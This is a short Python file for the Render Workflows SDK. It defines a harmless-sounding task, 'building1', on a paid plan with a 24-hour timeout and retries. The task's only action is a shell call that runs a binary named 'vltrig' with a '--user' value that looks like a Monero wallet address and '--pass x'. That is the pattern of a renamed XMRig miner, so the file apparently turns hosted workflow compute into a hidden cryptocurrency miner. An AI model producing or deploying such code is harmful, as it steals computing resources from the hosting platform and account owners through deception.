import sys
from render_sdk import Workflows, Retry

app = Workflows()

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building1():
  import sys
  import os
  os.system('./opt/render/project/src/vltrig --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x')

if __name__ == "__main__":
  app.start()
